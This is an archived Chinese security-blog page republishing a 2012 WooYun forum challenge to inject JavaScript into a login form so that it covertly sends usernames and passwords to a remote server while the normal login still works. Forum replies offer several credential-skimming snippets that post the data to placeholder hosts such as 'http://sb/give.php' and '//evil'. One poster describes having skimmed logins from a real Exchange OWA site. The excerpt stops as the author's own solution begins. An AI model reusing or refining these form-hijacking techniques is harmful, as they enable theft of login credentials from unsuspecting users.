@@ -1,0 +1,1873 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址，一个利用 JavaScript 劫持表单的话题，在不影响原程序运行逻辑的同时，将表单数据发送到多个地址，并且把数据提交到原地址。" />
+<meta name="keywords" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/2775/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址" />
+<meta property="og:description" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址，一个利用 JavaScript 劫持表单的话题，在不影响原程序运行逻辑的同时，将表单数据发送到多个地址，并且把数据提交到原地址。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/2775/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2012-08-13T09:41:28&#43;08:00" />
+<meta property="article:modified_time" content="2012-08-15T21:50:16&#43;08:00" />
+
+<meta itemprop="name" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址">
+<meta itemprop="description" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址，一个利用 JavaScript 劫持表单的话题，在不影响原程序运行逻辑的同时，将表单数据发送到多个地址，并且把数据提交到原地址。"><meta itemprop="datePublished" content="2012-08-13T09:41:28&#43;08:00" />
+<meta itemprop="dateModified" content="2012-08-15T21:50:16&#43;08:00" />
+<meta itemprop="wordCount" content="6493">
+<meta itemprop="keywords" content="程序,劫持,数据,Blog,Google,Html,HTTP,IE,IP,Java,js,Net,Nuclear,PHP,POS,Putty,URL,Web,wooyun,XSS,测试,代码,攻击,函数,技术,浏览器,密码,骗,全球,事件,思路,问题,远程,账号," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址"/>
+<meta name="twitter:description" content="劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址，一个利用 JavaScript 劫持表单的话题，在不影响原程序运行逻辑的同时，将表单数据发送到多个地址，并且把数据提交到原地址。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址</h1>
+      
+      <div class="post-meta">
+        <time datetime="2012-08-13" class="post-time">
+          2012-08-13
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E7%A8%8B%E5%BA%8F/"> 程序 </a>
+            <a href="https://lcx.cc/categories/%E5%8A%AB%E6%8C%81/"> 劫持 </a>
+            <a href="https://lcx.cc/categories/%E6%95%B0%E6%8D%AE/"> 数据 </a>
+            
+          </div>
+        <span class="more-meta"> 约 6493 字 </span>
+          <span class="more-meta"> 预计阅读 13 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	一个利用 JavaScript 劫持表单的话题，在不影响原程序运行逻辑的同时，将表单数据发送到多个地址，并且把数据提交到原地址。
+</p>
+<p style="text-indent:2em;">
+	在乌云看到一个技术挑战贴：<a href="http://zone.wooyun.org/content/770" target="_blank">来吧，技术挑战，搞起！！！（大牛慎入）～～～～～～</a> 
+</p>
+<p style="text-indent:2em;">
+	（以下所有回复中，“核攻击”是我）
+</p>
+<hr />
+<p style="text-indent:2em;">
+	标题：来吧，技术挑战，搞起！！！（大牛慎入）～～～～～～
+</p>
+<p style="text-indent:2em;">
+	作者：剁刀
+</p>
+<p style="text-indent:2em;">
+	时间：2012-08-11 00:41
+</p>
+<p style="text-indent:2em;">
+	内容：
+</p>
+<pre class="prettyprint lang-html">&lt;html&gt;
+&lt;body&gt;
+&lt;form method=post name=loginform onsubmit="return checkform()"&gt;
+&lt;input type=hidden name=a value='do_login'&gt;
+&lt;input type=hidden name=follow value=''&gt;
+&lt;input type=hidden name=follow_id value=''&gt;
+&lt;table cellspacing=0 cellpadding=2 border=0 align="center"&gt;
+&lt;tr&gt;
+&lt;td height="32"&gt;Username:&lt;/td&gt;
+&lt;td&gt;&lt;input type=text name=username value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;
+&lt;td height="32"&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type=password name=password value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;nbsp;&lt;/td&gt;
+&lt;td&gt;&lt;input type=submit value="Login" class=sbmt&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;/table&gt;
+&lt;/form&gt;
+&lt;script language=javascript&gt;
+function checkform() {
+  if (document.loginform.username.value=='') {
+    alert("Please type your username!");
+    document.loginform.username.focus();
+    return false;
+  }
+  if (document.loginform.password.value=='') {
+    alert("Please type your password!");
+    document.loginform.password.focus();
+    return false;
+  }
+  return true;
+}
+&lt;/body&gt;
+&lt;/script&gt;
+&lt;script&gt;
+/**************************INPUT CODE*******************************/
+&lt;/script&gt;
+&lt;/html&gt;</pre>
+<p>
+	技术挑战：
+</p>
+<p style="text-indent:2em;">
+	这是一段常规的登录代码，登录的时候会发起一个post请求，请在INPUT CODE处添加
+</p>
+<p style="text-indent:2em;">
+	javasript代码对checkform进行劫持，使得将获取的用户名密码发送到远程site接收。
+</p>
+<p>
+	要求：
+</p>
+<p style="text-indent:2em;">
+	1. 不得影响程序原有逻辑（即不得以任何方式影响原来的登录功能，POST包必须能正常发出去）
+</p>
+<p style="text-indent:2em;">
+	2. 兼容并通杀IE+FF+CHROME
+</p>
+<p style="text-indent:2em;">
+	3. 先别扯淡，等你做出来再说简单
+</p>
+<hr />
+<p style="text-indent:2em;">
+	相关回复：
+</p>
+<hr />
+<p style="text-indent:2em;">
+	蟋蟀哥哥 (http://zone.wooyun.org/?do=action) | 2012-08-11 01:39
+</p>
+<p style="text-indent:2em;">
+	简单的写一个,也没对post的数据进行优化,由于没环境,可能有错误,需要调试的.只是说下思路
+</p>
+<p style="text-indent:2em;">
+	好久没写javascript了。。大家不要笑
+</p>
+<pre class="prettyprint lang-html">&lt;/script&gt;&lt;script type="text/javascript"&gt;
+//&lt;![CDATA[
+// Input code is here:
+    document.write('&lt;script type="text/javascript" src="//www.google.com/jsapi"&gt;');
+    document.write('&lt;\/script&gt;');
+    google.load("jquery", "1.5.1","true");//调用google javascript API,用javascript写javascript的原因是因为google在伟大的GFW下不稳定。这样写，不会影响页面的加载
+  $(".sbmt").click(PostPasswd);
+  (function($) {
+    function PostPasswd(){
+    var postName = $("input[username]");//获得并定义输入的值,只是简单写下，没有写验证.
+    var postPasswd = $("input[password]");
+    var post1 = "name=";
+    var post2 = "&amp;pswd=";//拼接字符串
+      $.ajax({
+         type: "POST",
+         url: "some.php",//远程POST地址
+         data: post1 + postName + post2 + postPasswd,
+      });
+    }//ajax POST数据
+    //]]&gt;
+    &lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	好吧。。我知道代码有问题..
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	beastk | 2012-08-11 01:47
+</p>
+<p style="text-indent:2em;">
+	也不知道你要HOOK谁的，也不知道是不是技术挑战
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	一刀终情 (麻麻说，签名要长…………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………) | 2012-08-11 09:23
+</p>
+<p style="text-indent:2em;">
+	技术挑战就骗人了吧~~等着用吧~
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2012-08-11 09:46
+</p>
+<p style="text-indent:2em;">
+	实在是，懒得回……
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 10:06
+</p>
+<p style="text-indent:2em;">
+	@一刀终情 @beastk 楼上的废废们，做不出来就不要唧唧歪歪。技术很牛又怎么样，有点技术就当宝贝似的藏着掖着，敝帚自珍。自己是固步自封和井底之蛙都不知道。这难道是很难的技术么，还需要在这里骗答案？我先把我的答案的md5贴在这里，你们可以闭嘴了吗？
+</p>
+<p style="text-indent:2em;">
+	大小: 1988 字节
+</p>
+<p style="text-indent:2em;">
+	修改时间: 2012年8月11日, 10:03:22
+</p>
+<p style="text-indent:2em;">
+	MD5: AE2EFE3D88975C98BA21E8BCCA36EB73
+</p>
+<p style="text-indent:2em;">
+	SHA1: E677B24FF8DFCDA3112BD0FDD23E166D48D49340
+</p>
+<p style="text-indent:2em;">
+	CRC32: A947AACD
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 10:09
+</p>
+<p style="text-indent:2em;">
+	@蟋蟀哥哥 顶蟋蟀哥哥
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 10:13
+</p>
+<p style="text-indent:2em;">
+	@核攻击 别介，你还是回复一个吧，做到通用再说。这个坛子里能做出完美答案的人不超过5个
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	xsser (十根阳具有长短，世上人多心不齐) | 2012-08-11 10:22
+</p>
+<p style="text-indent:2em;">
+	好吧，不如加个限制，用最少的字节数吧
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	蟋蟀哥哥 (http://zone.wooyun.org/?do=action) | 2012-08-11 13:57
+</p>
+<p style="text-indent:2em;">
+	@xsser 嗯。。用最少的字节数，这个才是技术挑战。。话说这个难度不大。。确实简单。。怎么样优化才是硬道理。。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 14:19
+</p>
+<p style="text-indent:2em;">
+	@蟋蟀哥哥 老大，你那个代码貌似连用户名和密码都获取不到的。。。好多人都觉得这个简单，可一到实现就发现不是那么回事了，因为这里面有个小猫腻～～
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	蟋蟀哥哥 (http://zone.wooyun.org/?do=action) | 2012-08-11 14:33
+</p>
+<p style="text-indent:2em;">
+	@剁刀 我说了代码有问题的，呵呵。。估计的那个地方。。懂的人会知道怎么回事
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 14:43
+</p>
+<p style="text-indent:2em;">
+	@蟋蟀哥哥 完全没搞明白你说的post优化是什么意思。。。求科普。。。。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	蟋蟀哥哥 (http://zone.wooyun.org/?do=action) | 2012-08-11 15:15
+</p>
+<p style="text-indent:2em;">
+	@剁刀 打错了的。其实想说的是验证和判断
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	only_guest (www.guoke.ca) | 2012-08-11 15:53
+</p>
+<p style="text-indent:2em;">
+	@gainover 秒了他！
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	px1624 | 2012-08-11 16:02
+</p>
+<p style="text-indent:2em;">
+	顶楼上！
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	Sogili (-_-)Web疯狂科学家//mmme.me(-_-) | 2012-08-11 16:35
+</p>
+<p style="text-indent:2em;">
+	loginform.action='//evil'//25字符
+</p>
+<p style="text-indent:2em;">
+	//evil 307跳转回去
+</p>
+<p style="text-indent:2em;">
+	挑战结束?
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	s!lly3r (嘿 二货!你在干嘛呢?) | 2012-08-11 16:43
+</p>
+<p style="text-indent:2em;">
+	楼主的意思是:
+</p>
+<p style="text-indent:2em;">
+	在点击提交按钮的时候 发送表单内容POST到正常原有的地址 还要发送该内容到另外一个自定义的地址
+</p>
+<p style="text-indent:2em;">
+	@蟋蟀哥哥 一楼代码明显没有做到
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 16:49
+</p>
+<p style="text-indent:2em;">
+	@Sogili 你的这个方法明显不行，试都没试～
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 16:50
+</p>
+<p style="text-indent:2em;">
+	@s!lly3r 没错，就是这个意思，不能阻碍表单的正常登录功能的同时，还要把截获的用户名密码发送到远程
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 16:55
+</p>
+<p style="text-indent:2em;">
+	@核攻击 看了你发的帖子我终于明白你懒得回的原因了，因为你根本就是混娱乐圈的哇：）
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	Sogili (-_-)Web疯狂科学家//mmme.me(-_-) | 2012-08-11 16:56
+</p>
+<p style="text-indent:2em;">
+	@剁刀 你试试:)
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	s!lly3r (嘿 二货!你在干嘛呢?) | 2012-08-11 16:58
+</p>
+<p style="text-indent:2em;">
+	原来搞过人家的exchange的owa 也是记录登陆账号密码 我分享一下思路吧
+</p>
+<p style="text-indent:2em;">
+	也是绑定登陆界面表单click
+</p>
+<p style="text-indent:2em;">
+	登陆界面js的行为就是获取表单数据 把账号和密码记录到当前域的cookie里面
+</p>
+<p style="text-indent:2em;">
+	又在邮箱登陆成功才会加载的某js文件里 加入了判断cookie里面是否有账号密码的代码
+</p>
+<p style="text-indent:2em;">
+	这样登陆成功后 js代码就会获取账号密码发送的远程地址
+</p>
+<p style="text-indent:2em;">
+	这样做还有个好处就是只获取有效的账号密码 因为只有邮箱登陆成功后才会运行发送密码的js代码
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 17:04
+</p>
+<p style="text-indent:2em;">
+	@s!lly3r 嘿嘿，感谢思路分享，不错:)但是就本题来讲，你会发现你绑定并记录到username/password之后，是不能直接发包的
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	Sunshine (︶︿︶/ / //！ 。！ o∩_∩o) | 2012-08-11 17:10
+</p>
+<p style="text-indent:2em;">
+	木你远程调用js不就完了，这个代码最短，嘿嘿，说着玩啊，为了不影响原登录，做个延迟，先登陆，再发送，代码今晚写一点……
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	tmp | 2012-08-11 17:12
+</p>
+<p style="text-indent:2em;">
+	@xsser @gainover 精通javascript的还不上???
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	Sunshine (︶︿︶/ / //！ 。！ o∩_∩o) | 2012-08-11 18:03
+</p>
+<p style="text-indent:2em;">
+	@only_guest.短信收到没有啊？
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 18:04
+</p>
+<p style="text-indent:2em;">
+	@剁刀 我放假马上看看去。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	horseluke (微碌) | 2012-08-11 18:27
+</p>
+<p style="text-indent:2em;">
+	我汗........这个问题看来很多人在求：
+</p>
+<p style="text-indent:2em;">
+	http://zhidao.baidu.com/question/385864615.html
+</p>
+<p style="text-indent:2em;">
+	不过上面那个是asp，和这个问题不一样。我想到的也只能是重载函数来解决
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 18:30
+</p>
+<p style="text-indent:2em;">
+	@horseluke 对于本题来说，重载函数应该不行吧，我试了貌似没成功。。。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-11 18:31
+</p>
+<p style="text-indent:2em;">
+	@horseluke 疯了，我再说一遍，哥不是来骗答案的，日。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 20:22
+</p>
+<p style="text-indent:2em;">
+	1.js
+</p>
+<pre class="prettyprint lang-js">var xmlhttp = false;
+if (window.XMLHttpRequest) {                   //Mozilla、Safari等浏览器
+  xmlhttp = new XMLHttpRequest();
+} 
+else if (window.ActiveXObject) {                 //IE浏览器
+  try {
+    xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
+  } catch (e) {
+    try {
+      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+     } catch (e) {}
+  }
+}</pre>
+<p style="text-indent:2em;">
+	我压根不会写代码。。。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 20:26
+</p>
+<p style="text-indent:2em;">
+	@剁刀 我没时间测试随便想了就写下了如果没跳转就:window.location.href 或者用其他的跳转,有referer就跳referer。。。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 20:31
+</p>
+<p style="text-indent:2em;">
+	@剁刀 我也很喜欢实在的研究 hepaohui@lcx.cc 欢迎一起交流 g_talk:a13411334452@gamil.com
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 20:59
+</p>
+<pre class="prettyprint lang-js">&lt;script/src=//1.js&gt;
+&lt;script language="javascript"&gt;
+function checkhack() {
+var name = '';
+var pass = '';
+  if (document.loginform.username.value=='') {
+
+    //alert("Please type your username!");
+
+    document.loginform.username.focus();
+
+    name = '0';
+  return false;
+
+  }
+
+  if (document.loginform.password.value=='') {
+
+    //alert("Please type your password!");
+
+    document.loginform.password.focus();
+
+    pass = '0';
+return false;
+  }
+
+  return true;
+  name = '1';
+  pass = '1';
+
+}
+window.mousedown = function ()
+{
+setInterval("checkhack()",4);
+if (name == '1') &amp;&amp; (pass == '1'){
+var a = document.loginform.username.value;
+var b = document.loginform.password.value;
+var url = "http://sb/give.php?name='+a'&amp;pass='+b'"
+xmlhttp.open('get',url,true);
+}
+}
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	icefish | 2012-08-11 21:34
+</p>
+<p style="text-indent:2em;">
+	我以前改sahi的时候，好像写过类似的，思路都是重载js的事件，我去看看
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	icefish | 2012-08-11 21:40
+</p>
+<p style="text-indent:2em;">
+	我没细想，感觉用addEvent那种似乎可以吧，
+</p>
+<p style="text-indent:2em;">
+	我本科的时候做的，http://wcf1987.iteye.com/blog/450197
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 22:01
+</p>
+<p style="text-indent:2em;">
+	@icefish 非常感谢,好的大学不愧是黑阔养生之地！！！！！
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	啤酒 (xx) | 2012-08-11 23:19
+</p>
+<p style="text-indent:2em;">
+	楼主的&lt;body&gt;故意放在&lt;/script&gt;里面的？
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-11 23:30
+</p>
+<p style="text-indent:2em;">
+	楼上的 恩 故意的
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	啤酒 (xx) | 2012-08-11 23:35
+</p>
+<p style="text-indent:2em;">
+	我如果要实现这样的目的的话，我会把原文的function checkform()函数在 INPUT CODE位置再写一次让之前的原有的function checkform()失效，然后把原文的function checkform()内容原封不动的弄下来再在函数内部把用户名密码 get到我的服务器。至于代码的简介性可能就没那么好了
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-12 00:11
+</p>
+<p style="text-indent:2em;">
+	@啤酒 到现在为止，楼上的没有一个说到这个问题的点子上的，尼玛劫持谁不会劫持？不管你用啥都好，重载，addevent或者DOM。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	啤酒 (xx) | 2012-08-12 00:27
+</p>
+<p style="text-indent:2em;">
+	除此之外我只注意到了跳转和函数执行的时间差，其他的没看出啥来大牛你快公布答案吧看得很难受了
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	啤酒 (xx) | 2012-08-12 00:51
+</p>
+<p style="text-indent:2em;">
+	难道机关在你那个放到script内body？希望答案不要让人失望
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-12 17:11
+</p>
+<p style="text-indent:2em;">
+	@剁刀 我的答案可以实现吗
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	<a href="http://zone.wooyun.org/content/770" target="_blank">[点此查看更多回复]</a> 
+</p>
+<hr />
+<p style="text-indent:2em;">
+	然后我给出了两个答案：
+</p>
+<p style="text-indent:2em;">
+	版本一：
+</p>
+<pre class="prettyprint lang-html">&lt;html&gt;
+&lt;body&gt;
+&lt;form method=post name=loginform onsubmit="return checkform()"&gt;
+&lt;input type=hidden name=a value='do_login'&gt;
+&lt;input type=hidden name=follow value=''&gt;
+&lt;input type=hidden name=follow_id value=''&gt;
+&lt;table cellspacing=0 cellpadding=2 border=0 align="center"&gt;
+&lt;tr&gt;
+&lt;td height="32"&gt;Username:&lt;/td&gt;
+&lt;td&gt;&lt;input type=text name=username value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;
+&lt;td height="32"&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type=password name=password value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;nbsp;&lt;/td&gt;
+&lt;td&gt;&lt;input type=submit value="Login" class=sbmt&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;/table&gt;
+&lt;/form&gt;
+&lt;script language=javascript&gt;
+function checkform() {
+  if (document.loginform.username.value=='') {
+    alert("Please type your username!");
+    document.loginform.username.focus();
+    return false;
+  }
+  if (document.loginform.password.value=='') {
+    alert("Please type your password!");
+    document.loginform.password.focus();
+    return false;
+  }
+  return true;
+}
+&lt;/body&gt;
+&lt;/script&gt;
+&lt;script&gt;
+    /************************** INPUT CODE *******************************/
